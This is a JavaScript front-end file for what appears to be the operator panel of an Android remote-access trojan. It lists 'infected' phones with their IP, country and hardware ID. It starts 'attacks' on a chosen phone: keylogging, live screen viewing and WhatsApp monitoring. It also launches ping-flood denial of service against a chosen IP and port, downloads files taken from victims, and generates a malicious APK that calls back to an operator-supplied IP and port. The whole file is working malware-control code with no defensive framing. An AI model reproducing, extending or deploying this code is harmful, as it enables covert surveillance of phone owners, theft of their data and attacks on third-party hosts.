const infected = document.getElementById("infected")
const infos = document.getElementById("infos")
const form = document.getElementById("left")
const img = document.getElementById("img")
const msgs = document.getElementById("msgs")
const androidScreen = document.getElementById("imgSrc")
const downloadAPKInput = document.querySelector('#downloadAPK input')
const downloadAPKBnt = document.querySelector('#downloadAPK img')
const userList = document.getElementById('userListTable');
const fileList = document.getElementById('fileList');
const deviceStatus = document.getElementById('devicestatus');

let CurrentDevice = ""
let CurrentAttack = ""
//pingStop.disabled = true
let myId
let selectedId


document.querySelectorAll("form").forEach(e=>{
    e.addEventListener("submit",i=>i.preventDefault())
})

document.getElementById('clearLogButton').addEventListener('click', function() {
    document.getElementById('fileContent').value = ''; // Clears the textarea
});

function createFileListItem(file) {
    const li = document.createElement('li');
    const text = document.createTextNode(file);
    li.appendChild(text);

    const downloadIcon = document.createElement('span');
    downloadIcon.textContent = '⬇️';
    downloadIcon.className = 'download-icon';
    downloadIcon.onclick = () => window.location.href = `/download/${file}`;
    li.appendChild(downloadIcon);

    li.onclick = () => displayFileContent(file);

    return li;
}

// index.js

document.getElementById('downloadAllButton').addEventListener('click', function() {
    //const id = prompt("Enter the ID to download all files:");
    if (selectedId) {
        window.location.href = `/download-all/${selectedId}`;
    } else {
        alert('Please select a device to download all files.');
    }
});

async function fetchFiles() {
    await fetch('/files')
        .then(response => response.json())
        .then(files => {
            files.forEach(file => {
                fileList.appendChild(createFileListItem(file));
            });
        })
        .catch(error => console.error('Error fetching files:', error));
}

function displayFileContent(fileName) {
    fetch(`/content/${fileName}`)
        .then(response => response.text())
        .then(content => {
            document.getElementById('fileContent').value = content;
        })
        .catch(error => console.error('Error fetching file content:', error));
}

document.addEventListener('DOMContentLoaded', function() {
    fetchFiles();

    const getCellValue = (tr, idx) => tr.children[idx].innerText || tr.children[idx].textContent;
    const comparer = (idx, asc) => (a, b) => ((v1, v2) => 
        v1 !== '' && v2 !== '' && !isNaN(v1) && !isNaN(v2) ? v1 - v2 : v1.toString().localeCompare(v2)
        )(getCellValue(asc ? a : b, idx), getCellValue(asc ? b : a, idx));

    // This function is triggered when a header is clicked
    document.querySelectorAll('th').forEach(th => th.addEventListener('click', (() => {
        const table = th.closest('table');
        const tbody = table.querySelector('tbody');
        Array.from(tbody.querySelectorAll('tr'))
            .sort(comparer(Array.from(th.parentNode.children).indexOf(th), this.asc = !this.asc))
            .forEach(tr => tbody.appendChild(tr));
    })));

    const showDeviceListBtn = document.getElementById('showDeviceList');
    const showContainerBtn = document.getElementById('showContainer');
    const userContainer = document.getElementById('userContainer');
    const container = document.getElementById('mainContainer');

    function toggleActiveButton(activeBtn) {
        // Remove active class from both buttons
        showDeviceListBtn.classList.remove('activeButton');
        showContainerBtn.classList.remove('activeButton');
        // Add active class to the clicked button
        activeBtn.classList.add('activeButton');
    }

    showDeviceListBtn.addEventListener('click', function() {
        container.style.display = 'none';
        userContainer.style.display = 'block'; // Adjust display style as per your layout
        toggleActiveButton(showDeviceListBtn); // Mark this button as active
    });

    showContainerBtn.addEventListener('click', function() {
        container.style.display = 'block'; // Adjust display style as per your layout
        userContainer.style.display = 'none';
        toggleActiveButton(showContainerBtn); // Mark this button as active
    });

    toggleActiveButton(showContainerBtn);
});

/* Clearing */
// form.reset()
infos.innerHTML = '<div class="info"> <span>DeviceName : </span> <span>--</span> </div> <div class="info"> <span>Country :</span> <span>--</span> </div> <div class="info"> <span>ISP :</span> <span>--</span> </div> <div class="info"> <span>IP :</span> <span>--</span> </div> <div class="info"> <span>Brand :</span> <span>--</span> </div> <div class="info"> <span>Model :</span> <span>--</span> </div> <div class="info"> <span>Manufacture :</span> <span>--</span> </div> <div class="info"> <span>HWID :</span> <span>--</span> </div> <div class="info"> <span>isOnline :</span> <span>--</span> </div>'

function stopAttack(){
    // STOPING CURRENT ATTACK
    if(CurrentAttack != ""){
        msgSend(CurrentDevice,CurrentAttack,"stop")
        ele = document.querySelector('input[name="attack"]:checked')
        if(ele != null){
            ele.checked = false
        }
        CurrentAttack = ""

        // console.log(CurrentAttack,ele)
    }
}

function DOS(val){
    if(val){
        // START DOS (PING) ATTACK
        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "")){
            msgSend("id","ping","start",pingIp.value,pingPort.value,pingWait.value)
            pingStop.disabled = false
            pingStart.disabled = true
        }else{
            alert(42)
        }
    }else{
        msgSend("id","ping","stop")
        pingStop.disabled = true
        pingStart.disabled = false
    }
}

async function getInfo(id){
    //await stopAttack()
    if(id != "None"){
        $.ajax({
            url : document.location.origin+'/info',
            method : 'POST',
            type : 'POST',
            data : {
                id : id,
                adminId: myId,
            },
            success : async (data)=>{
                // console.log(data)
                //await stopAttack()
                CurrentDevice = id
                tmp = ""
                delete data['ID']
                for(i in data){
                    if(i === "HWID") {
                        selectedId = data[i]
                        filterFiles()
                    }
                    tmp += `<div class="info">
                    <span>${i} :</span>
                    <span>${data[i]}</span>
                </div>` 
                }
                infos.innerHTML = tmp
                msgSend(CurrentDevice,"logger","start")
            }
        })
    }else{
        CurrentDevice = ""
        infos.innerHTML = '<div class="info"> <span>DeviceName : </span> <span>--</span> </div> <div class="info"> <span>Country :</span> <span>--</span> </div> <div class="info"> <span>ISP :</span> <span>--</span> </div> <div class="info"> <span>IP :</span> <span>--</span> </div> <div class="info"> <span>Brand :</span> <span>--</span> </div> <div class="info"> <span>Model :</span> <span>--</span> </div> <div class="info"> <span>Manufacture :</span> <span>--</span> </div> <div class="info"> <span>HWID :</span> <span>--</span> </div> <div class="info"> <span>isOnline :</span> <span>--</span> </div>'
        fileList.innerHTML = '';
        fetchFiles()
    }
}

async function filterFiles(date) {
    deviceId = selectedId;
    fileList.innerHTML = '';
    await fetchFiles();
    const filteredFiles = [];
    const files = Array.from(fileList.querySelectorAll('li'));
    files.forEach(file => {
        const name = file.textContent.trim();
        const fileId = name.split(' | ')[0];
        const fileDate = name.split(' | ')[2].split('.').slice(0, -1).join('.');
        if (fileId === deviceId && !date) {
            filteredFiles.push(file);
            console.log("fileId === deviceId && !date")
        } else if (fileId === deviceId && fileDate === date) {
            filteredFiles.push(file);
            console.log("fileId === deviceId && fileDate === date")
        } else if (!deviceId && fileDate === date) {
            filteredFiles.push(file);
            console.log("!deviceId && fileDate === date")
        } else if (!deviceId && !date) {
            filteredFiles.push(file);
            console.log("!deviceId && !date")
        }
    });
    fileList.innerHTML = '';
    filteredFiles.forEach(file => {
        fileList.appendChild(file);
    });
}

/** Making Socket Connections */
const socket = io(`ws://${document.location.hostname}:4001/`,{transports: ['websocket'], upgrade: false})
const output = document.getElementById("output")
const outputnotif = document.getElementById("outputnotif")
const connstatustext = document.getElementById("status")
const wastatus = document.getElementById("statuswa")

socket.on("connect", () =>{
    connstatustext.innerText = "Server online! Connected to server."
    connstatustext.style.color = "green"
})

socket.on("disconnect", () =>{
    connstatustext.innerText = "Disconnected from server."
    connstatustext.style.color = "red"
})

socket.on("logger",(data)=>{
    // console.log(data)
    output.append(data+"\n")
    //output.scrollTo(0,output.scrollTopMax) 
    output.scrollTop = output.scrollHeight;
})

socket.on("img",(data)=>{
    img.src = "data:image/jpeg;charset=utf-8;base64,"+data 
})

socket.on("info",(data)=>{
    $('#userListTable tbody').empty();
    infected.innerHTML = '<option data-display="Infected">None</option>'
    data.forEach((i, index)=>{
        infected.insertAdjacentHTML("beforeend",`<option value="${i.ID}">${i.DeviceName} (${i.Model}) ${i.isOnline===1 ? "Online" : "Offline"}</option>`) 

        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${index+1}</td>
            <td>${i.HWID}</td>
            <td>${i.DeviceName}</td>
            <td>${i.Model}</td>
            <td>${i.IP}</td>
            <td bgcolor="${i.isOnline===1 ? "#90EE90" : "#FF7F7F"}">${i.isOnline===1 ? "Online" : "Offline"}</td>
        `;
        userList.querySelector('tbody').appendChild(row);
    })
    $("select").niceSelect("update")
})

socket.on("notif", (data)=>{
    outputnotif.append(data+"\n")
    //outputnotif.scrollTo(0,output.scrollTopMax)
    outputnotif.scrollTop = outputnotif.scrollHeight
})

socket.on("isonwa", (data, isonwa)=>{
    // console.log(data)
    output.append(data+"\n")
    //output.scrollTo(0,output.scrollTopMax) 
    output.scrollTop = output.scrollHeight;
    if (isonwa) {
        wastatus.innerText = "User is using Whatsapp"
        wastatus.style.color = "green"
    } else {
        wastatus.innerText = "User not on Whatsapp"
        wastatus.style.color = "red"
    }
})

socket.on("masId", (data)=>{
    myId = data
})


/** Making Socket Connections */



/** Functions */
function msgSend(id,emit,...args){
    $.ajax({
        url : document.location.origin+'/send',
        method : 'POST',
        type : 'POST',
        data : {
            emit : emit,
            id : id,
            adminId : myId,
            args : args
        },
        success : (data)=>{
            console.log(data)
        }
    })
}

// Function for selecting only one check box in a group
$('input[type="checkbox"]').on('change', async function() {
    if(this.checked){
        $('input[name="' + this.name + '"]').not(this).prop('checked', false);
    }

    console.log(this)
    if(CurrentAttack == "screen"){
        androidScreen.style.opacity = "0"
        androidScreen.style.pointerEvents = "none"
        rightBG.style.opacity = "1"
        output.style.opacity = "1"
    }

    await stopAttack()
    

    CurrentAttack = this.value

    if(this.checked && CurrentAttack == "screen"){
        androidScreen.style.opacity = "1"
        androidScreen.style.pointerEvents = "all"
        rightBG.style.opacity = "0"
        output.style.opacity = "0"
    }


    // console.log(CurrentDevice,this.value,"start")
    if(this.checked){
        msgSend(CurrentDevice,this.value,"start")
    }else{
        CurrentAttack = ""
    }
    
});
// androidScreen.style.opacity = "1"
// androidScreen.style.pointerEvents = "all"
// rightBG.style.opacity = "0"
// output.style.opacity = "0"

/* Debug info *
const  txt  = document.getElementById("txt")
function update(x,y) {
    txt.innerHTML = `x : ${x}<Br>y : ${y}`  
}
img.addEventListener("mousemove",(evt)=>{
    // console.log(evt)
    x = ((evt.clientX - evt.target.getBoundingClientRect().x)/evt.target.width)*100
    y = ((evt.clientY - evt.target.getBoundingClientRect().y)/evt.target.height)*100
    update(x,y)
})
/* Debug info */

function download() {
    var data = downloadAPKInput.value.trim()
    try {
        if(data.length){
            var [m_ip,m_port]  = data.split(':')
            console.log()
            $.ajax({
                url:`/setup/${m_ip}/${m_port}`,
                success:(data)=>{
                    var a = document.createElement('a')
                    a.href = '/apk'
                    a.click() 
                }
            })    
        }else{
            showMsg('Invalid Ip and Port. [ IP:PORT ]')
        }
    } catch (error) {
        showMsg('Invalid Ip and Port. [ IP:PORT ]')
    }
}

function showMsg(msg) {
    var pTag = document.createElement("p")
    pTag.className = "msg"
    pTag.innerText = msg
    msgs.insertAdjacentElement("beforeend",pTag)
    setTimeout(()=>pTag.remove(),5000)
}

$(document).ready(()=>{
    $("select").niceSelect()
}) 


